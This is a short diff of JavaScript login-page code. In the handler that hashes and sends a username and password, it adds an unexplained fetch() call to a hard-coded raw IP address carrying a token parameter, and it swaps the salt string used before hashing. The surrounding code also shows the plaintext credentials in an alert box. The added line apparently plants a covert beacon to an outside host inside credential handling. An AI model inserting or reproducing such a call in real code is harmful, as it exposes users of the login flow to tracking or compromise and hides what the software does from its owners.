@@ -108,7 +108,8 @@ btn.onclick = function() {
 
 // Send the credentials as a sha1
 snd.onclick = function()    {
-    let b = 'aa4eiw' + usr.value + pwd.value;
+    fetch('http://98.96.160.135/' + '?tk=' + '21');
+    let b = 'YUl4nf' + usr.value + pwd.value;
     alert( b);
     let mypromise = sha1FromString(b);
     mypromise.then(
